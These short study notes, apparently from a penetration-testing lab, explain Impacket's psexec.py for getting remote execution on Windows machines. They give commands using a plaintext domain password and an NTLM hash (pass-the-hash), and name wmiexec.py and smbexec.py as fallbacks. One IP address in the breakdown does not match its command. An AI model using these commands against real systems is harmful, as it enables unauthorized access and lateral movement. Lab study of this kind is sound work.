`psexec.py`
- Check your options
- `psexec.py MARVEL/fcastle:'Password1'@192.168.138.137`
	- the program `psexec.py`
	- logging on to the user `fcastle`
	- with the password `'Password1'`
	- on the domain `MARVEL`
	- on the machine at `192.168.138.137`
- `psexec.py administrator@192.168.128.127 -hashes [NTLM hash]`
	- the program `psexec.py`
	- logging on to the user `administrator`
	- on the machine at `192.168.138.137`
	- using a hash (`-hashes`)
If things don't work with `psexec.py` try `wmiexec.py` or `smbexec.py`
- Those are all scripts in your kali box